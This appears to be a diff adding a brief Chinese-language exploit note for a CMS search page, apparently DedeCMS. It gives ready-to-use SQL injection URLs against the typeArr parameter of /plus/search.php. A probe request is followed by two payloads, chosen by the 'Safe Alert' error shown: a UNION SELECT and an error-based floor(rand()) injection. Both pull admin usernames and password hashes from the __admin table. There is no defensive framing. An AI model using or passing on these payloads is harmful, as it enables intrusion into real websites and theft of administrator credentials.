@@ -1,0 +1,17 @@
+提交 xx.com/plus/search.php?keyword=as&typeArr[ uNion ]=a
+
+看结果如果提示
+
+Safe Alert: Request Error step 2 !
+
+那么直接用下面的exp
+
+xx.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
+
+看结果如果提示
+
+Safe Alert: Request Error step 1 !
+
+那么直接用下面的exp
+
+xx.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a
